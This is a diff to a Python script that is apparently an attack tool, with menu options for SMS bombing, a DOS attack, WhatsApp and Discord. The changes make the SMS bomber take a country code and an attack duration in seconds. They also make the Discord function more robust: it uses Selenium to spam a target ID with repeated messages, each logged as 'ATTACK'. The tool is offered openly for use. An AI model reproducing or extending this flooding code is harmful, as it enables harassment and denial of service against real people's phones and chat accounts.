@@ -23,6 +23,7 @@ import os
 import sys
 import time
 import random
+import shutil
 import socket
 import smtplib
 import os.path
@@ -72,6 +73,13 @@ def pb2():
 
 def pb3():              
 	spinner = Spinner('Updating the program ', max=20)
+	for i in range(20):
+		time.sleep(.12)
+		spinner.next()
+	spinner.finish()
+
+def pb4():              
+	spinner = Spinner('Clean up ', max=20)
 	for i in range(20):
 		time.sleep(.12)
 		spinner.next()
@@ -234,10 +242,10 @@ def smsbomber():
 ╚═══╩╝╚╝╚╩═══╝
 		'''))
 	try:
-		number = input('Enter the number for attack(7xxxxxxxxxx): ')
-		time2 = int(input('Attak time in minuets: '))
-		time2*=60
-
+		code=input('Enter your country code without +: ')
+		number = code+input(f'Enter the number for attack: {code}')
+		time2 = int(input('Attak time in seconds: '))
+		print('\nStarting...\n')
 		settings.attack(number, time2)
 		print("\033[32m {}" .format("\nFinished!"))
 		ex()
@@ -9670,11 +9678,18 @@ def dscrd():
 		time.sleep(15)
 		driver.get(f"https://discord.com/channels/@me/{ID}")
 		time.sleep(15)
+		cn=0
 
-		msgBox = driver.find_element_by_xpath('//*[@id="app-mount"]/div[2]/div/div[2]/div/div/div/div/div[2]/div[2]/main/form/div/div[1]/div/div[3]/div[2]/div')
 		for i in range(count):
-			msgBox.send_keys(msg + Keys.ENTER)
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(ID))
+			try:
+				time.sleep(1)
+				msgBox = driver.find_element(By.XPATH, '//*[@id="app-mount"]/div[2]/div/div[2]/div/div/div/div/div[2]/div[2]/main/form/div/div[1]/div/div[3]/div[2]')
+				msgBox.send_keys(msg + Keys.ENTER)
+				cn+=1
+				print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(ID))
+			except:
+				print("\033[31m{}" .format("\nERROR!"))
+				ex()
 
 		print("\033[32m {}" .format("Successful!"))
 		print(f"{count} messages were sent to {ID}")
@@ -9693,6 +9708,7 @@ def main():
 ┃ 3 ┃ DOS ATTACK                    ┃
 ┃ 4 ┃ WhatsApp                      ┃          
 ┃ 5 ┃ Discord                       ┃
+┃ 6 ┃ Clear the program cache       ┃                
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 	'''))
 
@@ -9722,6 +9738,15 @@ def main():
 		elif ans==5:
 			check_internet()
 			dscrd()
+		elif ans==6:
+			try:
+				pb4()
+				shutil.rmtree('__pycache__')
+				print('Success!')
+				ex()
+			except:
+				print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
+				ex()
 		else:
 			print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
 			ex()
